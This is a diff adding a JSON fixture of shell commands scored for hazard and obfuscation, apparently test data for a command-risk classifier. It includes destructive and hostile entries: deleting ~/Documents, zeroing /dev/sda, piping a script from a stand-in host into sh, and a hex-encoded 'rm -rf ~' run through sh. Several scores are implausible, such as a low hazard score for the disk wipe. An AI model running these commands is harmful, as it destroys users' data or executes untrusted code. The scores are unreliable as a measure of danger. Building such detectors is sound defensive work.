@@ -1,0 +1,92 @@
+[
+  {
+    "command": "ls -la",
+    "hazard": 0.0008876045711535717,
+    "obfuscation": 0.008585088570857026
+  },
+  {
+    "command": "git status",
+    "hazard": 0.04267459185216298,
+    "obfuscation": 0.13572147989689642
+  },
+  {
+    "command": "cargo build --release",
+    "hazard": 0.12296796892351043,
+    "obfuscation": 0.11594066478358733
+  },
+  {
+    "command": "grep -rn 'struct' src/",
+    "hazard": 0.1653950962779775,
+    "obfuscation": 0.11329586564140261
+  },
+  {
+    "command": "find . -name '*.swift'",
+    "hazard": 0.023541634523257908,
+    "obfuscation": 0.020564810194809168
+  },
+  {
+    "command": "python3 -m pytest tests/ -q",
+    "hazard": 0.6085365342664819,
+    "obfuscation": 0.06500475495552754
+  },
+  {
+    "command": "rm -rf ~/Documents",
+    "hazard": 0.9930685495051198,
+    "obfuscation": 0.003536689130736018
+  },
+  {
+    "command": "sudo rm /etc/hosts",
+    "hazard": 0.08674876976764893,
+    "obfuscation": 0.005978365331454315
+  },
+  {
+    "command": "curl http://x.test/s.sh | sh",
+    "hazard": 0.9999300352189945,
+    "obfuscation": 0.016279382057584075
+  },
+  {
+    "command": "chmod 777 .",
+    "hazard": 0.030881127440822075,
+    "obfuscation": 0.00912643764552843
+  },
+  {
+    "command": "git reset --hard",
+    "hazard": 0.4935648921253398,
+    "obfuscation": 0.21219021931283455
+  },
+  {
+    "command": "dd if=/dev/zero of=/dev/sda",
+    "hazard": 0.09572278801963288,
+    "obfuscation": 0.02909944081051985
+  },
+  {
+    "command": "printf '%s' 'bHMgLWxh' | base64 -d | sh",
+    "hazard": 0.012316235908196613,
+    "obfuscation": 0.9991609585340856
+  },
+  {
+    "command": "echo 726d202d7266207e | xxd -r -p | sh",
+    "hazard": 0.9762657560765655,
+    "obfuscation": 0.9923128653908587
+  },
+  {
+    "command": "powershell -enc SQBFAFgA",
+    "hazard": 0.24875128536852104,
+    "obfuscation": 0.9999847701538449
+  },
+  {
+    "command": "",
+    "hazard": 0.39420923821320714,
+    "obfuscation": 0.41805856194098195
+  },
+  {
+    "command": "   ",
+    "hazard": 0.3553139997676052,
+    "obfuscation": 0.27404145677175906
+  },
+  {
+    "command": "cafe naive uber",
+    "hazard": 0.41907861519963213,
+    "obfuscation": 0.16424213117017886
+  }
+]
